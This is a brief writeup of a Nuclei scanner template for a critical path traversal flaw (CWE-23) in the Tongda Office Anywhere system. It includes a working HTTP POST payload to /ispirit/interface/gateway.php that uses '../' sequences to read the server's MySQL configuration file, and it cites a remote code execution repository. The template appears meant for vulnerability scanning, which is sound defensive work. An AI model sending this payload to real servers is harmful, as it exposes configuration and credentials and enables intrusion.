# Nuclei Template: Office Anywhere TongDa - Path Traversal
**Template ID:** tongda-path-traversal
**Vulnerability Class:** Relative Path Traversal
**Severity:** Critical
**CWE:** CWE-23
**Source:** Nuclei Template (`tongda-path-traversal.yaml`)

## Vulnerability Information & PoC

## Description
Office Anywhere (OA) is susceptible to path traversal vulnerabilities which can be leveraged to perform remote code execution.

## Steps to reproduce / Exploit Payload
```http
POST /ispirit/interface/gateway.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

json={"url":"/general/../../mysql5/my.ini"}
```

## References
- https://github.com/jas502n/OA-tongda-RCE
